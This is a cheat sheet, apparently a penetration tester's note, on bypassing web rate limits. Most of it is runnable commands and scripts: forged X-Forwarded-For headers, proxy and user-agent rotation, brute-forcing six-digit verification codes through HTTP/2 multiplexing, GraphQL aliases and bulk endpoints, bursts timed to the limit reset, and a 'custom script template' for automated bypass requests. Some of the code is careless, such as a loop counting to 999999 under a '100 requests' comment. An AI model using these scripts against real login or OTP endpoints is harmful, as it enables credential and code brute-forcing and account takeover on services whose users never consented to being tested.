# 1. IP Rotation Techniques
## A. Header Spoffing

```bash
# Common IP headers
curl -H "X-Forwarded-For: 127.0.0.1" https://target.com
curl -H "X-Real-IP: 1.2.3.4" https://target.com
curl -H "CF-Connecting-IP: 5.6.7.8" https://target.com
curl -H "X-Client-IP: 9.10.11.12" https://target.com

# Multiple headers
curl -H "X-Forwarded-For: 1.1.1.1" \
     -H "X-Forwarded-For: 2.2.2.2" \
     https://target.com

# Random IP generator
for i in {1..100}; do
  curl -H "X-Forwarded-For: $((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256))" \
    https://target.com/action
done
```

## Real Proxy Rotation
```bash
# Using multiple proxies
proxies=("http://proxy1:8080" "http://proxy2:8080" "socks5://proxy3:9050")
for proxy in "${proxies[@]}"; do
  curl --proxy "$proxy" https://target.com/action
done

# With tools
# fireprox, catspin, shadowclone, ip-rotate
```

# 2. Endpoint Variation

## A. Path Variations

```bash
# Test different endpoints
endpoints=(
  "/api/signup"
  "/api/v1/signup" 
  "/api/v2/signup"
  "/signup"
  "/SignUp"
  "/SIGNUP"
  "/api/sign-up"
  "/api/sign_up"
)

for endpoint in "${endpoints[@]}"; do
  curl "https://target.com$endpoint" -d "user=test"
done
```

## B. Parameter Pollution

```bash
# Add random parameters
curl "https://target.com/login?cache=$(date +%s)" -d "user=test"
curl "https://target.com/login?rand=$RANDOM" -d "user=test"
curl "https://target.com/login?_=$RANDOM" -d "user=test"

# Different formats
curl "https://target.com/login;param=value" -d "user=test"
curl "https://target.com/login/extra/path" -d "user=test"
```

# 3. HTTP/2 Multiplexing Attack
## A. Single connection, Multiple Streams

```bash
# Send 100 requests in one HTTP/2 connection
for i in {000000..999999}; do
  echo "{\"code\":\"$i\"}"
done | xargs -I@ -P100 curl -k --http2-prior-knowledge \
  -X POST -H "Content-Type: application/json" \
  -d '{"code":"@"}' https://target.com/verify
```

## B. Turbo Intruder Setup

```python
# Python script for HTTP/2 multiplexing
def queueRequests(target, wordlist):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=100,  # Key setting
                           pipeline=False,
                           maxRetriesPerRequest=0,
                           timeoutSec=5,
                           engine=Engine.HTTP2)
    
    for word in open('wordlist.txt'):
        engine.queue(target.req, word.rstrip())

def handleResponse(req, interesting):
    if req.status != 429:  # Not rate limited
        table.add(req)
```

# 4. GraphQL Batching Bypass
## A. Aliases Attack

```graphql
mutation bruteForce {
  a1: verify(code: "111111") { token }
  a2: verify(code: "222222") { token }
  a3: verify(code: "333333") { token }
  a4: verify(code: "444444") { token }
  a5: verify(code: "555555") { token }
  # ... up to 100 aliases
}
```

## B. Batch Endpoint

```yaml
POST /graphql/batch
[
  {"query": "mutation {verify(code: \"111111\") {token}}"},
  {"query": "mutation {verify(code: \"222222\") {token}}"},
  {"query": "mutation {verify(code: \"333333\") {token}}"}
]
```

# 5. Timing Attacks

## A. Sliding Window Timing

```bash
# Send burst just before window reset
# Get reset time from headers
curl -I https://target.com | grep -i "rate.*reset"
# X-RateLimit-Reset: 1678901234

# Schedule burst at reset-1 second
at "now + 58 seconds" <<< "for i in {1..10}; do curl https://target.com; done"
```

## B. Response Monitoring

```bash
# Keep trying even when rate limited
while true; do
  response=$(curl -s -o /dev/null -w "%{http_code}" https://target.com/login)
  if [[ "$response" != "429" && "$response" != "403" ]]; then
    echo "Rate limit lifted!"
    break
  fi
  sleep 1
done
```

# 6. Header Manipulation

## A. User-Agent Rotation

```bash
user_agents=(
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
  "curl/7.68.0"
  "python-requests/2.25.1"
)

for ua in "${user_agents[@]}"; do
  curl -H "User-Agent: $ua" https://target.com/action
done
```

## B. Cookie/Session Rotation

```bash
# Generate random cookies
for i in {1..100}; do
  session=$(openssl rand -hex 16)
  curl -H "Cookie: session=$session" https://target.com/action
done

# Or login before each attempt
curl -c cookies.txt -d "user=test&pass=test" https://target.com/login
curl -b cookies.txt https://target.com/protected
```

# 7. Bulk/Batch Endpoint Abuse

## A. Array Payloads

```yaml
POST /api/v2/bulk
[
  {"action": "verify", "code": "111111"},
  {"action": "verify", "code": "222222"},
  {"action": "verify", "code": "333333"}
]
```

## B. Custom Batch Endpoints

```bash
# Look for /batch, /bulk, /multi
curl https://target.com/api/batch
curl https://target.com/api/v1/bulk
curl https://target.com/batch/execute
```

# 8. Endpoint & Obfuscation

## A. Whitespace Insertion

```bash
# Different whitespace characters
curl -d "code=123456%0a" https://target.com/verify
curl -d "code=123456%0d" https://target.com/verify  
curl -d "code=123456%09" https://target.com/verify
curl -d "code=123456%20" https://target.com/verify
```

## B. Case Variation

```bash
# Case-sensitive filters
curl -d "CODE=123456" https://target.com/verify
curl -d "Code=123456" https://target.com/verify
curl -d "cOdE=123456" https://target.com/verify
```

# 9. Protocol-Level Bypass

## A. HTTP/1.1 vs HTTP/2

```bash
# Try different protocols
curl --http1.1 https://target.com/action
curl --http2 https://target.com/action
curl --http2-prior-knowledge https://target.com/action
```

## B. Chunked Encoding

```bash
# Some WAFs parse chunked differently
echo -e "7\r\nx=test&\r\n0\r\n\r\n" | \
  nc target.com 443 | \
  openssl s_client -connect target.com:443 -quiet
```

# 10. automated Tools

## A. hashtag-fuzz

```bash
# Header randomization, proxy rotation
hashtag-fuzz -u https://target.com/FUZZ -w wordlist.txt \
  -H "X-Forwarded-For: RANDOM" \
  -p proxies.txt
```

## B. Burp Suite + IPRotate

```yaml
1. Install IPRotate extension
2. Configure with AWS keys
3. Run Intruder attack
4. Each request uses different IP
```

## C. Custom Script Template

```python
import requests
import random
import time

proxies = ['http://proxy1', 'http://proxy2']
headers_list = [
    {'User-Agent': 'Mozilla/5.0'},
    {'User-Agent': 'curl/7.68.0'},
    {'User-Agent': 'python-requests/2.25.1'}
]

def bypass_request(url, data):
    proxy = random.choice(proxies)
    headers = random.choice(headers_list)
    headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    
    response = requests.post(url, data=data, headers=headers, proxies={'http': proxy, 'https': proxy})
    return response
```

# 11. Quick Testing Workflow

## Step 1: Recon

```bash
# Detect rate limits
for i in {1..20}; do curl https://target.com/login; done
# Check response: 429, 403, Retry-After, X-RateLimit-*
```

## Step 2: IP Rotation Test

```bash
# Try different IP headers
for header in X-Forwarded-For X-Real-IP CF-Connecting-IP; do
  curl -H "$header: 127.0.0.1" https://target.com/login
done
```
## Step 3: Endpoint Variation

```bash
# Test different paths
curl https://target.com/api/v1/login
curl https://target.com/api/v2/login  
curl https://target.com/API/login
curl https://target.com/Login
```

## Step 4: Protocol Tests

```bash
# HTTP/2 multiplexing
curl --http2-prior-knowledge -X POST \
  --data '{"code":"test"}' \
  https://target.com/verify
```

## 🔥Critical Bypass Techniques

### **High Priority:**

1. **HTTP/2 Multiplexing** - 100+ requests in 1 connection
    
2. **GraphQL Aliases** - Multiple mutations in single request
    
3. **IP Header Spoofing** - X-Forwarded-For rotation
    
4. **Bulk Endpoints** - /batch, /bulk endpoints
    
5. **Path Variations** - Different API versions/case

### **Medium Priority:**

1. **User-Agent Rotation** - Avoid fingerprinting
    
2. **Parameter Pollution** - Add random params
    
3. **Session Rotation** - Login before each attempt
    
4. **Timing Attacks** - Burst at window reset
    
5. **Encoding Tricks** - Whitespace, case variations
